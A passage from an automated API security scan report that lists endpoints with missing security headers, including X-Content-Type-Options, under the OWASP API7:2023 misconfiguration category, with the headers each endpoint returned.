#### 8. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. PUT /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 12. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 13. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 14. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. GET /identity/api/v2/vehicle/{vehicleId}/location
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 16. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 20. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 21. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing X-Content-Type-Options Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the X-Content-Type-Options security header.

**Affected Endpoints (4):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

---
